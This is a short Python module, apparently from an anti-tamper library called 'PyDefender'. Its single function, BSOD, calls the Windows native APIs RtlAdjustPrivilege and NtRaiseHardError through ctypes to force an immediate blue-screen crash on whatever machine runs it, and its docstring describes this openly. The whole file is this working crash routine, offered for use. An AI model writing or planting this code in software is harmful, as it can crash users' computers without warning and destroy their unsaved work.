"""
   ___       ___      ___            __       
  / _ \__ __/ _ \___ / _/__ ___  ___/ /__ ____
 / ___/ // / // / -_) _/ -_) _ \/ _  / -_) __/
/_/   \_, /____/\__/_/ \__/_//_/\_,_/\__/_/   
     /___/                                    


Made with 💞 by kova / api
- Made with program protection in mind.
"""
import ctypes

def BSOD() -> None:
    """
    Blue screens the computer that it is called on

    Returns:
        An angry user
    """
    nullptr = ctypes.POINTER(ctypes.c_int)()
    ctypes.windll.ntdll.RtlAdjustPrivilege(
        ctypes.c_uint(19),
        ctypes.c_uint(1),
        ctypes.c_uint(0),
        ctypes.byref(ctypes.c_int()),
    )
    ctypes.windll.ntdll.NtRaiseHardError(
        ctypes.c_ulong(0xC000007B),
        ctypes.c_ulong(0),
        nullptr,
        nullptr,
        ctypes.c_uint(6),
        ctypes.byref(ctypes.c_uint()),
    )